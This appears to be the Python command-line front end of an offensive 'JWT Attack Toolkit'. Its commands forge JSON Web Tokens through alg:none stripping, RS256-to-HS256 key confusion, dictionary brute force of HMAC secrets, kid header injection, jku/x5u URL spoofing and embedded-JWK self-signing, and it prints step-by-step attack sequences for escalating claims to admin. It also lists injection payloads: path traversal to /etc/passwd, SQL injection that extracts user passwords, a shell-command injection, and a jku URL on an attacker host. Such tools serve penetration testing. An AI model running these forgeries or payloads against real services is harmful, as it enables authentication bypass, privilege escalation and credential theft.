#!/usr/bin/env python3
import json
import time
from pathlib import Path
from typing import Optional

import typer
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
from rich.table import Table

from jwt_toolkit.core import (
    jwt_decode_header, jwt_decode_payload, jwt_split,
    b64url_encode, check_expiry,
)
from jwt_toolkit.attacks import (
    attack_alg_none, attack_rs256_hs256, bruteforce_secret,
    forge_hs, forge_rs, attack_kid_injection,
    attack_jku_spoof, attack_embedded_jwk, _verify_hs,
)

app = typer.Typer(
    name="jwt-toolkit",
    help="JWT Attack Toolkit — parse, forge, attack",
    add_completion=False,
    rich_markup_mode="rich",
)
console = Console()

BANNER = """[bold cyan]
     ██╗██╗    ██╗████████╗    ████████╗██╗  ██╗
     ██║██║    ██║╚══██╔══╝       ██╔══╝╚██╗██╔╝
     ██║██║ █╗ ██║   ██║          ██║    ╚███╔╝ 
██   ██║██║███╗██║   ██║          ██║    ██╔██╗ 
╚█████╔╝╚███╔███╔╝   ██║          ██║   ██╔╝ ██╗
 ╚════╝  ╚══╝╚══╝    ╚═╝          ╚═╝   ╚═╝  ╚═╝[/bold cyan]
[dim]JWT Attack Toolkit  |  linkedin.com/in/emreaslany[/dim]
"""

PRIVILEGE_CLAIMS = {
    "role", "roles", "admin", "is_admin", "isadmin",
    "scope", "permissions", "groups", "authorities",
    "access", "privilege", "level", "tier", "plan",
    "account_type", "user_type", "is_staff", "staff", 
    "superuser", "is_superuser", "is_root", 
    "root", "is_sudo", "sudo","is_poweruser", 
    "poweruser", "usertype", "account_type", "subscription", 
    "is_premium", "premium", "is_vip", "vip", "is_member",
    "member", "is_employee", "employee", "is_contributor", 
    "contributor", "perm", "perms", "access_level", "auth_level", 
    "authorization", "security_level","admin_level", "admin_access", 
    "admin_role", "user_role", "user_access", "user_permissions","member",
    "verified", "is_verified", "active", "is_active", "enabled", 
    "is_enabled","authenticated", "is_authenticated","confirmed", 
    "is_confirmed", "approved", "is_approved", "account_status", "status",
    "user_status", "is_user", "is_account"
}

SENSITIVE_CLAIMS = {"email", "phone", "ssn", "password", 
                    "secret", "token", "key", "credential", 
                    "api_key", "apikey", "auth", "session", 
                    "cookie", "data", "info", "details", 
                    "profile", "user", "account", "id", "uid", 
                    "username", "name", "fullname", "full_name", 
                    "first_name", "last_name", "tckn", "tax_id", 
                    "address", "location", "geo","tc", "nationality",
                    "nation_id", "driver_license", "passport", "credit_card", 
                    "bank_account", "iban", "swift", "routing_number",
                    "phone_number", "email_address", "url", "uri", "ip"
                    }

PRIVILEGE_CLAIMS = set(PRIVILEGE_CLAIMS)
SENSITIVE_CLAIMS = set(SENSITIVE_CLAIMS)

ALG_RISKS: dict[str, tuple[str, str]] = {
    "none":  ("CRITICAL", "No signature — token is completely unsigned"),
    "HS256": ("HIGH",     "HMAC-SHA256 — vulnerable to weak secret bruteforce"),
    "HS384": ("HIGH",     "HMAC-SHA384 — vulnerable to weak secret bruteforce"),
    "HS512": ("HIGH",     "HMAC-SHA512 — vulnerable to weak secret bruteforce"),
    "RS256": ("MEDIUM",   "RSA-SHA256 — try algorithm confusion (HS256) if pubkey is known"),
    "RS384": ("MEDIUM",   "RSA-SHA384 — try algorithm confusion (HS384) if pubkey is known"),
    "RS512": ("MEDIUM",   "RSA-SHA512 — try algorithm confusion (HS512) if pubkey is known"),
    "ES256": ("LOW",      "ECDSA-SHA256 — check for library-level signature malleability"),
    "ES384": ("LOW",      "ECDSA-SHA384 — check for library-level signature malleability"),
    "ES512": ("LOW",      "ECDSA-SHA512 — check for library-level signature malleability"),
    "PS256": ("LOW",      "RSASSA-PSS SHA256 — generally secure, check implementation"),
}

RISK_COLORS = {"CRITICAL": "bold red", "HIGH": "red", "MEDIUM": "yellow", "LOW": "green"}


def print_banner():
    console.print(BANNER)


def _risk_badge(level: str) -> str:
    color = RISK_COLORS.get(level, "white")
    return f"[{color}]{level}[/{color}]"


def print_jwt_info(token: str):
    try:
        header  = jwt_decode_header(token)
        payload = jwt_decode_payload(token)
        _, _, sig = jwt_split(token)
    except Exception as exc:
        console.print(f"[red]Parse error: {exc}[/red]")
        raise typer.Exit(1)

    h_table = Table(
        title="[bold yellow]Header[/bold yellow]",
        show_header=True, header_style="bold blue",
    )
    h_table.add_column("Field", style="cyan")
    h_table.add_column("Value", style="white")
    h_table.add_column("Note", style="dim")

    alg = header.get("alg", "unknown")
    alg_level, alg_note = ALG_RISKS.get(alg, ("UNKNOWN", "Unknown algorithm"))
    for k, v in header.items():
        note = ""
        if k == "alg":
            note = f"{_risk_badge(alg_level)} {alg_note}"
        elif k == "kid":
            note = "[red]Potential injection point[/red]"
        elif k in ("jku", "x5u"):
            note = "[red]URL spoofing target[/red]"
        elif k == "jwk":
            note = "[red]Embedded key — self-signed attack surface[/red]"
        h_table.add_row(str(k), str(v), note)
    console.print(h_table)

    p_table = Table(
        title="[bold yellow]Payload / Claims[/bold yellow]",
        show_header=True, header_style="bold blue",
    )
    p_table.add_column("Claim", style="cyan")
    p_table.add_column("Value", style="white")
    p_table.add_column("Note", style="dim")

    claim_notes = {
        "sub": "Subject identifier",
        "iss": "Issuer",
        "aud": "Audience",
        "exp": "Expiry",
        "iat": "Issued At",
        "nbf": "Not Before",
        "jti": "JWT ID (replay prevention)",
    }

    for k, v in payload.items():
        k_lower = str(k).lower()
        note = claim_notes.get(k_lower, "")
        if k_lower in PRIVILEGE_CLAIMS:
            note = "[red]⚠ Privilege claim — escalation target[/red]"
        elif k_lower in SENSITIVE_CLAIMS:
            note = "[yellow]⚠ Sensitive data (PII/secret)[/yellow]"

        if k_lower in ("exp", "iat", "nbf"):
            try:
                ts = time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime(int(v)))
                p_table.add_row(str(k), f"{v}  ({ts})", note)
            except Exception:
                p_table.add_row(str(k), str(v), note)
        else:
            p_table.add_row(str(k), str(v), note)

    console.print(p_table)

    exp_status = check_expiry(payload)
    if exp_status:
        console.print(f"\n  Expiry : {exp_status}")

    sig_display = (sig[:48] + "...") if len(sig) > 48 else (sig or "[italic](empty)[/italic]")
    console.print(f"  Signature : [dim]{sig_display}[/dim]")


# ── Commands ──────────────────────────────────────────────────────────────────

@app.command("parse", help="Decode and inspect a JWT token")
def cmd_parse(
    token: str = typer.Argument(..., help="JWT token string"),
    raw:   bool = typer.Option(False, "--raw", "-r", help="Output raw JSON (pipe-friendly)"),
):
    if not raw:
        print_banner()
    try:
        if raw:
            header  = jwt_decode_header(token)
            payload = jwt_decode_payload(token)
            console.print_json(json.dumps({"header": header, "payload": payload}))
        else:
            print_jwt_info(token)
    except Exception as exc:
        console.print(f"[red]{exc}[/red]")
        raise typer.Exit(1)


@app.command("summary", help="Full attack-surface analysis with prioritised findings")
def cmd_summary(
    token: str = typer.Argument(..., help="JWT token string"),
):
    print_banner()
    try:
        header  = jwt_decode_header(token)
        payload = jwt_decode_payload(token)
    except Exception as exc:
        console.print(f"[red]{exc}[/red]")
        raise typer.Exit(1)

    alg = header.get("alg", "unknown")
    kid = header.get("kid")
    jku = header.get("jku")
    x5u = header.get("x5u")
    jwk = header.get("jwk")
    typ = header.get("typ", "")

    alg_level, alg_desc = ALG_RISKS.get(alg, ("UNKNOWN", "Unrecognised algorithm"))

    findings: list[tuple[str, str, str]] = []

    findings.append(("Algorithm", f"{alg}", f"{_risk_badge(alg_level)} — {alg_desc}"))

    if kid is not None:
        findings.append(("kid header", str(kid),
            "[red]CRITICAL[/red] — Key ID is injectable; test path traversal and SQL injection"))
    if jku is not None:
        findings.append(("jku header", str(jku),
            "[red]CRITICAL[/red] — JWK Set URL; point to attacker-controlled endpoint"))
    if x5u is not None:
        findings.append(("x5u header", str(x5u),
            "[red]CRITICAL[/red] — X.509 URL; point to attacker-controlled certificate"))
    if jwk is not None:
        findings.append(("jwk header", "(embedded)",
            "[red]CRITICAL[/red] — Embedded public key; try self-signed token attack"))

    priv = [k for k in payload if str(k).lower() in PRIVILEGE_CLAIMS]
    if priv:
        findings.append(("Privilege Claims", ", ".join(priv),
            f"[red]HIGH[/red] — Modify {priv[0]} to escalate privileges"))

    pii = [k for k in payload if str(k).lower() in SENSITIVE_CLAIMS]
    if pii:
        findings.append(("Sensitive Data", ", ".join(pii),
            "[yellow]MEDIUM[/yellow] — PII/secrets exposed in token body"))

    exp_status = check_expiry(payload)
    if exp_status:
        findings.append(("Expiry", "", exp_status))
    else:
        findings.append(("Expiry", "exp not set",
            "[red]HIGH[/red] — No expiry; token is permanent"))

    if "jti" not in payload:
        findings.append(("Replay Protection", "jti absent",
            "[yellow]MEDIUM[/yellow] — No JWT ID; token may be replayable"))

    if str(typ).upper() not in ("JWT", ""):
        findings.append(("typ header", str(typ), "[yellow]INFO[/yellow] — Non-standard type"))

    table = Table(
        title="[bold]Attack Surface Report[/bold]",
        show_header=True, header_style="bold magenta",
        show_lines=True,
    )
    table.add_column("Finding",  style="cyan",  no_wrap=True)
    table.add_column("Value",    style="white", overflow="fold")
    table.add_column("Severity / Notes", overflow="fold")

    for f in findings:
        table.add_row(*f)

    console.print(table)

    console.print("\n[bold]Recommended Attack Sequence:[/bold]\n")
    step = 1

    if alg.lower() == "none":
        console.print(f"  {step}. Token has no signature — use it as-is or modify claims freely")
        step += 1

    if alg.startswith("HS"):
        console.print(f"  {step}. [yellow]jwt-toolkit brute <token> -w wordlists/jwt-secrets.txt[/yellow]")
        console.print(f"     └─ Then: [yellow]jwt-toolkit forge <token> -s <secret> -c role=admin[/yellow]")
        step += 1
        console.print(f"  {step}. [yellow]jwt-toolkit none <token>[/yellow]  (try all case variants)")
        step += 1

    if alg.startswith("RS") or alg.startswith("ES"):
        console.print(f"  {step}. Retrieve server public key via JWKS endpoint or TLS cert, then:")
        console.print(f"     [yellow]jwt-toolkit confusion <token> --pubkey server_pub.pem[/yellow]")
        step += 1
        console.print(f"  {step}. [yellow]jwt-toolkit none <token>[/yellow]  (some implementations accept it)")
        step += 1

    if jwk:
        console.print(f"  {step}. [yellow]jwt-toolkit jwk-inject <token> -k private.pem -c role=admin[/yellow]")
        step += 1

    if kid is not None:
        console.print(f"  {step}. Path traversal: [yellow]jwt-toolkit kid <token> --kid '../../dev/null' --secret ''[/yellow]")
        console.print(f"     SQLi:           [yellow]jwt-toolkit kid <token> --kid \"x' UNION SELECT 'pwned'-- -\" --secret 'pwned'[/yellow]")
        step += 1

    if jku or x5u:
        hdr = "jku" if jku else "x5u"
        console.print(f"  {step}. Host attacker JWK Set at ngrok/VPS, then:")
        console.print(f"     [yellow]jwt-toolkit jku-spoof <token> --url https://attacker.com/.well-known/jwks.json -k private.pem[/yellow]")
        step += 1

    if priv:
        console.print(f"  {step}. Once secret/key is known:")
        console.print(f"     [yellow]jwt-toolkit forge <token> -s <secret> -c {priv[0]}=admin[/yellow]")
        step += 1

    if not priv:
        console.print(f"  {step}. [dim]No obvious privilege claims — enumerate possible hidden claims (admin, role, is_staff)[/dim]")


@app.command("none", help="alg:none attack — strip signature, generate case-mutation variants")
def cmd_none(
    token:     str           = typer.Argument(..., help="Target JWT token"),
    no_extend: bool          = typer.Option(False, "--no-extend", help="Do not extend expiry"),
    output:    Optional[Path]= typer.Option(None,  "--output", "-o", help="Write tokens to file"),
):
    print_banner()
    console.print("[bold red]alg:none Attack[/bold red]\n")

    try:
        variants = attack_alg_none(token, extend_exp=not no_extend)
    except Exception as exc:
        console.print(f"[red]Error: {exc}[/red]")
        raise typer.Exit(1)

    results = []
    for name, forged in variants.items():
        console.print(Panel(f"[dim]{forged}[/dim]", title=f"[yellow]{name}[/yellow]", expand=False))
        results.append(forged)

    if output:
        output.write_text("\n".join(results))
        console.print(f"\n[green]✓ {len(results)} variants saved to {output}[/green]")
    else:
        console.print(f"\n[green]✓ {len(results)} variants generated[/green]")
        console.print("[dim]Tip: send each in Burp Repeater — different servers reject different cases[/dim]")


@app.command("confusion", help="RS256→HS256 algorithm confusion — sign with public key as HMAC secret")
def cmd_confusion(
    token:     str           = typer.Argument(..., help="Target JWT token"),
    pubkey:    Path          = typer.Option(...,  "--pubkey", "-k",  help="Server RSA public key (PEM)"),
    no_extend: bool          = typer.Option(False,"--no-extend",     help="Do not extend expiry"),
    output:    Optional[Path]= typer.Option(None, "--output", "-o"),
):
    print_banner()
    console.print("[bold red]RS256 → HS256 Algorithm Confusion[/bold red]\n")

    if not pubkey.exists():
        console.print(f"[red]Public key not found: {pubkey}[/red]")
        raise typer.Exit(1)

    try:
        forged = attack_rs256_hs256(token, str(pubkey), extend_exp=not no_extend)
    except Exception as exc:
        console.print(f"[red]Error: {exc}[/red]")
        raise typer.Exit(1)

    console.print(Panel(
        f"[green]{forged}[/green]",
        title="[yellow]Forged Token (HS256 signed with server public key)[/yellow]",
        expand=False,
    ))
    if output:
        output.write_text(forged)
        console.print(f"\n[green]✓ Saved to {output}[/green]")

    console.print("\n[dim]How it works: server trusts 'alg' header — switches to HMAC, "
                  "uses same key material it would use for RSA verify.[/dim]")
    console.print("[dim]Public key sources: GET /.well-known/jwks.json  |  openssl s_client  |  /api/auth/certs[/dim]")


@app.command("brute", help="Dictionary attack against HMAC-signed tokens")
def cmd_brute(
    token:    str           = typer.Argument(..., help="Target JWT token"),
    wordlist: Path          = typer.Option(...,  "--wordlist", "-w", help="Wordlist file path"),
    output:   Optional[Path]= typer.Option(None, "--output",   "-o", help="Save found secret to file"),
):
    print_banner()
    console.print("[bold red]HMAC Secret Bruteforce[/bold red]\n")

    if not wordlist.exists():
        console.print(f"[red]Wordlist not found: {wordlist}[/red]")
        raise typer.Exit(1)

    try:
        header   = jwt_decode_header(token)
        alg      = header.get("alg", "?")
        kid_hint = header.get("kid", "")
        line_count = sum(1 for _ in open(wordlist, errors="ignore"))
    except Exception as exc:
        console.print(f"[red]{exc}[/red]")
        raise typer.Exit(1)

    console.print(f"  Algorithm : [cyan]{alg}[/cyan]")
    console.print(f"  Wordlist  : {wordlist}  ([cyan]{line_count:,}[/cyan] entries)")
    if kid_hint:
        console.print(f"  kid hint  : [yellow]{kid_hint}[/yellow]  (may reveal secret derivation)")
    console.print()

    start = time.time()
    state = {"tried": 0}

    def progress(n: int, current: str):
        state["tried"] = n
        if line_count > 0:
            prog.update(task_id, completed=n)
        else:
            prog.update(task_id, description=f"Testing: {current}")

    try:
        with Progress(
            TextColumn("[bold blue]{task.description}"),
            BarColumn(bar_width=40),
            TextColumn("{task.completed}/{task.total}" if line_count > 0 else "{task.description}"),
            TimeElapsedColumn(),
            TimeRemainingColumn(),
            console=console,
            transient=True,
        ) as prog:
            total = line_count if line_count > 0 else 1
            task_id = prog.add_task("Bruteforcing", total=total)
            secret = bruteforce_secret(token, str(wordlist), callback=progress)
            if line_count == 0:
                prog.update(task_id, completed=1)
    except ValueError as exc:
        console.print(f"\n[red]{exc}[/red]")
        raise typer.Exit(1)

    elapsed = time.time() - start
    console.print()

    if secret:
        console.print(Panel(
            f"[bold green]SECRET FOUND:[/bold green]  [white bold]{secret}[/white bold]",
            title="[green]✓ SUCCESS[/green]",
            border_style="green",
        ))
        console.print(f"\n[dim]Next step: jwt-toolkit forge <token> -s '{secret}' -c role=admin[/dim]")
        if output:
            output.write_text(secret)
            console.print(f"[green]Saved to {output}[/green]")
    else:
        console.print(Panel(
            f"[yellow]Secret not found in wordlist.[/yellow]\n\n"
            f"[dim]Time: {elapsed:.2f}s   |   Tested: {state['tried']:,}[/dim]",
            title="[yellow]✗ Not found[/yellow]",
            border_style="yellow",
        ))
        console.print("[dim]Try a larger wordlist: rockyou.txt, hashcat-jwt rules, or custom mutations[/dim]")


@app.command("forge", help="Clone a token, override claims, re-sign with known key")
def cmd_forge(
    token:     str               = typer.Argument(..., help="Source JWT token"),
    secret:    Optional[str]     = typer.Option(None, "--secret", "-s",  help="HMAC secret"),
    privkey:   Optional[Path]    = typer.Option(None, "--privkey", "-k", help="RSA private key (PEM)"),
    claim:     Optional[list[str]]= typer.Option(None, "--claim",  "-c", help="Claim override: key=value (repeatable)"),
    alg:       str               = typer.Option("HS256", "--alg",        help="Signing algorithm"),
    no_extend: bool              = typer.Option(False,  "--no-extend",   help="Do not extend expiry"),
    output:    Optional[Path]    = typer.Option(None,   "--output", "-o"),
):
    print_banner()
    console.print("[bold cyan]JWT Forge[/bold cyan]\n")

    if not secret and not privkey:
        console.print("[red]Provide --secret (HMAC) or --privkey (RSA)[/red]")
        raise typer.Exit(1)
    if secret and privkey:
        console.print("[red]Use only one signing method: --secret or --privkey[/red]")
        raise typer.Exit(1)

    claims_dict: dict = {}
    if claim:
        for c in claim:
            if "=" not in c:
                console.print(f"[red]Invalid claim format: {c!r}  (expected key=value)[/red]")
                raise typer.Exit(1)
            k, v = c.split("=", 1)
            try:
                claims_dict[k] = json.loads(v)
            except json.JSONDecodeError:
                claims_dict[k] = v

    try:
        if secret:
            forged = forge_hs(token, secret, alg=alg,
                              claims=claims_dict or None, extend_exp=not no_extend)
        else:
            forged = forge_rs(token, str(privkey), alg=alg,
                              claims=claims_dict or None, extend_exp=not no_extend)
    except Exception as exc:
        console.print(f"[red]Error: {exc}[/red]")
        raise typer.Exit(1)

    if claims_dict:
        console.print("[bold]Modified claims:[/bold]")
        for k, v in claims_dict.items():
            console.print(f"  [cyan]{k}[/cyan]  →  [yellow]{v}[/yellow]")
        console.print()

    console.print(Panel(
        f"[green]{forged}[/green]",
        title="[yellow]Forged Token[/yellow]",
        expand=False,
    ))

    if output:
        output.write_text(forged)
        console.print(f"\n[green]✓ Saved to {output}[/green]")


@app.command("kid", help="kid header injection — path traversal and SQL injection payloads")
def cmd_kid(
    token:  str            = typer.Argument(..., help="Target JWT token"),
    kid:    str            = typer.Option("../../dev/null", "--kid",       help="kid value to inject"),
    secret: str            = typer.Option("",              "--secret", "-s", help="HMAC signing secret"),
    output: Optional[Path] = typer.Option(None,            "--output", "-o"),
):
    print_banner()
    console.print("[bold red]kid Header Injection[/bold red]\n")
    console.print(f"  kid    : [yellow]{kid}[/yellow]")
    console.print(f"  secret : [yellow]{secret!r}[/yellow]\n")

    try:
        forged = attack_kid_injection(token, secret=secret, kid_payload=kid)
    except Exception as exc:
        console.print(f"[red]Error: {exc}[/red]")
        raise typer.Exit(1)

    console.print(Panel(
        f"[green]{forged}[/green]",
        title="[yellow]Forged Token (kid injected)[/yellow]",
        expand=False,
    ))
    if output:
        output.write_text(forged)
        console.print(f"\n[green]✓ Saved to {output}[/green]")

    console.print("\n[bold]Common kid payloads:[/bold]")
    payloads = [
        ("../../dev/null",                              "Linux /dev/null → HMAC key = empty string"),
        ("/dev/null",                                   "Absolute variant"),
        ("../../../../etc/passwd",                      "Read /etc/passwd as key material"),
        ("x' UNION SELECT 'pwned'-- -",                 "SQL injection → control key via DB"),
        ("x' UNION SELECT password FROM users-- -",     "SQL injection → exfiltrate password as key"),
        ("|ls${IFS}/tmp",                               "Command injection if kid is shell-interpolated"),
    ]
    for p, desc in payloads:
        console.print(f"  [yellow]{p!r:50}[/yellow]  {desc}")


@app.command("jku-spoof", help="jku/x5u header spoofing — redirect to attacker-controlled JWK endpoint")
def cmd_jku_spoof(
    token:   str           = typer.Argument(..., help="Target JWT token"),
    url:     str           = typer.Option(...,  "--url",    "-u",  help="Attacker-controlled JWK Set URL"),
    privkey: Path          = typer.Option(...,  "--privkey", "-k", help="Attacker RSA private key (PEM)"),
    output:  Optional[Path]= typer.Option(None, "--output", "-o"),
):
    print_banner()
    console.print("[bold red]jku / x5u URL Spoofing[/bold red]\n")
    console.print(f"  JWK URL : [yellow]{url}[/yellow]")

    try:
        forged = attack_jku_spoof(token, jku_url=url, private_key_path=str(privkey))
    except Exception as exc:
        console.print(f"[red]Error: {exc}[/red]")
        raise typer.Exit(1)

    console.print(Panel(
        f"[green]{forged}[/green]",
        title="[yellow]Forged Token (jku spoofed)[/yellow]",
        expand=False,
    ))
    if output:
        output.write_text(forged)
        console.print(f"\n[green]✓ Saved to {output}[/green]")

    console.print("\n[bold]Setup checklist:[/bold]")
    console.print("  1. Generate attacker key pair:  jwt-toolkit gen-keys -o ./attacker-keys")
    console.print("  2. Build JWKS file:             jwt-toolkit gen-jwks -k attacker-keys/public.pem")
    console.print("  3. Host at target URL:          python3 -m http.server 8080  (or ngrok)")
    console.print("  4. Send forged token to target and observe response")


@app.command("jwk-inject", help="Embed attacker public key in jwk header (self-signed attack)")
def cmd_jwk_inject(
    token:   str               = typer.Argument(..., help="Target JWT token"),
    privkey: Path              = typer.Option(...,  "--privkey", "-k", help="Attacker RSA private key (PEM)"),
    claim:   Optional[list[str]]= typer.Option(None, "--claim",  "-c", help="Claim override: key=value"),
    output:  Optional[Path]   = typer.Option(None, "--output",  "-o"),
):
    print_banner()
    console.print("[bold red]Embedded JWK Self-Signed Attack[/bold red]\n")

    claims_dict: dict = {}
    if claim:
        for c in claim:
            if "=" not in c:
                console.print(f"[red]Invalid claim: {c!r}[/red]")
                raise typer.Exit(1)
            k, v = c.split("=", 1)
            try:
                claims_dict[k] = json.loads(v)
            except json.JSONDecodeError:
                claims_dict[k] = v

    try:
        forged = attack_embedded_jwk(token, str(privkey), claims=claims_dict or None)
    except Exception as exc:
        console.print(f"[red]Error: {exc}[/red]")
        raise typer.Exit(1)

    console.print(Panel(
        f"[green]{forged}[/green]",
        title="[yellow]Forged Token (embedded JWK)[/yellow]",
        expand=False,
    ))
    if output:
        output.write_text(forged)
        console.print(f"\n[green]✓ Saved to {output}[/green]")
    console.print("\n[dim]RFC 8725 §3.9 prohibits trusting embedded keys — many implementations still do.[/dim]")


@app.command("verify", help="Verify a token signature against a known HMAC secret")
def cmd_verify(
    token:  str = typer.Argument(..., help="JWT token"),
    secret: str = typer.Option(..., "--secret", "-s", help="HMAC secret"),
):
    result = _verify_hs(token, secret)
    if result:
        console.print(f"[bold green]✓ VALID — signature verified with secret: {secret!r}[/bold green]")
    else:
        console.print(f"[bold red]✗ INVALID — signature does not match[/bold red]")


@app.command("gen-keys", help="Generate an RSA key pair for testing")
def cmd_gen_keys(
    out_dir: Path = typer.Option(Path("."), "--out", "-o", help="Output directory"),
    bits:    int  = typer.Option(2048,      "--bits",      help="Key size (2048 or 4096)"),
):
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.backends import default_backend

    console.print(f"Generating {bits}-bit RSA key pair...")
    key = rsa.generate_private_key(
        public_exponent=65537, key_size=bits, backend=default_backend()
    )
    priv_path = out_dir / "private.pem"
    pub_path  = out_dir / "public.pem"

    priv_path.write_bytes(key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL,
        serialization.NoEncryption(),
    ))
    pub_path.write_bytes(key.public_key().public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo,
    ))
    console.print(f"[green]✓ Private key : {priv_path}[/green]")
    console.print(f"[green]✓ Public key  : {pub_path}[/green]")


@app.command("gen-jwks", help="Generate a JWKS JSON file from a public key (for jku hosting)")
def cmd_gen_jwks(
    pubkey: Path          = typer.Option(...,  "--pubkey", "-k", help="Public key PEM file"),
    kid:    str           = typer.Option("key-1", "--kid",       help="Key ID to embed"),
    output: Optional[Path]= typer.Option(None, "--output", "-o", help="Output file (default: stdout)"),
):
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.backends import default_backend

    with open(pubkey, "rb") as fh:
        pub = serialization.load_pem_public_key(fh.read(), backend=default_backend())

    nums = pub.public_numbers()
    n_bytes = nums.n.to_bytes((nums.n.bit_length() + 7) // 8, "big")
    e_bytes = nums.e.to_bytes((nums.e.bit_length() + 7) // 8, "big")

    jwks = {
        "keys": [{
            "kty": "RSA",
            "use": "sig",
            "alg": "RS256",
            "kid": kid,
            "n": b64url_encode(n_bytes),
            "e": b64url_encode(e_bytes),
        }]
    }
    jwks_json = json.dumps(jwks, indent=2)

    if output:
        output.write_text(jwks_json)
        console.print(f"[green]✓ JWKS saved to {output}[/green]")
        console.print(f"[dim]Host with: python3 -m http.server 8080[/dim]")
    else:
        console.print_json(jwks_json)


if __name__ == "__main__":
    app()
